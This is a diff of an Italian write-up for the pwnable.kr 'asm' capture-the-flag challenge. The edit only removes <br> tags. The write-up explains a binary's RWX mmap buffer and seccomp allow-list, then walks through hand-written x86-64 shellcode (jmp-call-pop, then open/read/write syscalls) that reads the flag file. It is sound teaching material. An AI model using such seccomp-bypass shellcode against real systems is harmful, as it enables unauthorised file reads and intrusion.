@@ -135,10 +135,10 @@ ASM ~ HCF
 
 ;quando un processo è in modalità SECCOMP, può utilizzare solo un sottoinsieme limitato di syscall. Se tenta di eseguire una syscall non permessa, il kernel può:
 
-;terminare il processo (modo più restrittivo).<br>
-;restituire un errore.<br>
-;inviare un segnale.<br>
-;permettere l'esecuzione (se configurato con filtri BPF, come in questo caso).<br>
+;terminare il processo (modo più restrittivo).
+;restituire un errore.
+;inviare un segnale.
+;permettere l'esecuzione (se configurato con filtri BPF, come in questo caso).
 
 @@@
 [0x00000b20]> s main
@@ -152,10 +152,10 @@ mov edi, 0x41414000
 call sym.imp.mmap
 @@@
 
-;mmap crea una pagina RWX all'indirizzo 0x41414000.<br>
-;0x32, flags(MAP_PRIVATE|MAP_ANONYMOUS)<br>
-;7, prot(PROT_READ|WRITE|EXEC)<br>
-;0x1000, size(4kb).<br>
+;mmap crea una pagina RWX all'indirizzo 0x41414000.
+;0x32, flags(MAP_PRIVATE|MAP_ANONYMOUS)
+;7, prot(PROT_READ|WRITE|EXEC)
+;0x1000, size(4kb).
 
 @@@
 0x00000e0a mov qword [buf], rax
@@ -225,9 +225,9 @@ mov edi, 0
 call sym.imp.read
 @@@
 
-;add rax, rdx, buf+0x2e.<br>
-;0x3e8, max 1000 bytes.<br>
-;legge la nostra shellcode e la scrive dopo lo stub (offset 0x2e, 46 byte, le istruzioni di azzeramento dei registri).<br>
+;add rax, rdx, buf+0x2e.
+;0x3e8, max 1000 bytes.
+;legge la nostra shellcode e la scrive dopo lo stub (offset 0x2e, 46 byte, le istruzioni di azzeramento dei registri).
 
 @@@
 mov rax, qword [buf]
@@ -261,26 +261,27 @@ call rax
 @@@
 
 ;nella funzione ci sono tutta una serie di chiamate a seccomp_rule_add che definiscono quali syscall sono permesse; seccomp_rule_add aggiunge una regola che permette (mov esi, 0x7fff0000 ; action = SCMP_ACT_ALLOW) una specifica syscall.
-;syscall permesse:<br>
-;read 0<br>
-;write 1<br>
-;open 2<br>
-;exit 60 (0x3c)<br>
-;exit_group 231 (0xe7)<br>
-;obiettivo<br>
+
+;syscall permesse:
+;read 0
+;write 1
+;open 2
+;exit 60 (0x3c)
+;exit_group 231 (0xe7)
+;obiettivo
 ;leggere il contenuto del file con il nome lunghissimo:
 
 @@@
 this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong
 @@@
 
-;dato che il filename è troppo lungo per essere inserito direttamente nello shellcode come immediato, usiamo la tecnica jmp-call-pop:<br>
-<br>
-;jmp a una label che contiene il filename.<br>
-;call torna indietro al codice principale (push rip sullo stack, che contiene l'indirizzo della stringa filename).<br>
-;pop recupera l'indirizzo del filename dallo stack.<br>
-<br>
-;shellcode exploit<br>
+;dato che il filename è troppo lungo per essere inserito direttamente nello shellcode come immediato, usiamo la tecnica jmp-call-pop:
+
+;jmp a una label che contiene il filename.
+;call torna indietro al codice principale (push rip sullo stack, che contiene l'indirizzo della stringa filename).
+;pop recupera l'indirizzo del filename dallo stack.
+
+;shellcode exploit
 
 @@@
 from pwn import *
@@ -316,8 +317,8 @@ mov dx, 0x300
 syscall
 @@@
 
-;sys_read(fd,buffer,size)<br>
-;ritorna bytes letti in rax.<br>
+;sys_read(fd,buffer,size)
+;ritorna bytes letti in rax.
 
 @@@
 mov rdx, rax
@@ -381,11 +382,11 @@ xor rsi, rsi
 syscall
 @@@
 
-;syscall open()<br>
-;rdi già contiene il puntatore al filename.<br>
-;syscall 2 per open.<br>
-;flags O_RDONLY=0<br>
-;rdx non serve per open.<br>
+;syscall open()
+;rdi già contiene il puntatore al filename.
+;syscall 2 per open.
+;flags O_RDONLY=0
+;rdx non serve per open.
 ;fd ritornato in rax.
 
 @@@
@@ -397,13 +398,13 @@ mov dx, 0x300
 syscall
 @@@
 
-;syscall read()<br>
-;fd del file.<br>
-;syscall number 0 (read).<br>
-;sub rsp, crea spazio sullo stack.<br>
-;in rsi l'indirizzo del buffer dove scrivere.<br>
-;in dx 0x300 dimensione massima.<br>
-;bytes letti in rax.<br>
+;syscall read()
+;fd del file.
+;syscall number 0 (read).
+;sub rsp, crea spazio sullo stack.
+;in rsi l'indirizzo del buffer dove scrivere.
+;in dx 0x300 dimensione massima.
+;bytes letti in rax.
 
 @@@
 mov rdx, rax
@@ -412,11 +413,11 @@ mov dil, 1
 syscall
 @@@
 
-;syscall write()<br>
-;lunghezza da scrivere.<br>
-;syscall write.<br>
-;fd stdout.<br>
-;rsi già punta al buffer.<br>
+;syscall write()
+;lunghezza da scrivere.
+;syscall write.
+;fd stdout.
+;rsi già punta al buffer.
 
 
 @@@
@@ -425,9 +426,9 @@ xor rdi, rdi
 syscall
 @@@
 
-;syscall exit()<br>
-;exit code 0.<br>
-<br>
+;syscall exit()
+;exit code 0.
+
 ;eseguendo lo script otteniamo la flag dal file con il nome estremamente lungo.
 
 @@@
